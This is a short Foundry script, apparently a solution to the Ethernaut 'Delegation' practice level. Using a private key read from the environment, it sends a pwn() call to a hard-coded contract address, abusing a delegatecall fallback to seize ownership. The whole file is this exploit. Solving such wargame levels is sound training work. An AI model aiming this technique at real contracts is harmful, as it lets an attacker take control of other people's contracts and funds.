// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

// import "../src/06_Delegation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract DelegationAttack is Script {
    address target = 0x8557a61172C1c652411Ee5446A688Ba95D480c78;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        (bool success,) = target.call(abi.encodeWithSignature("pwn()"));
        require(success);

        vm.stopBroadcast();
    }
}
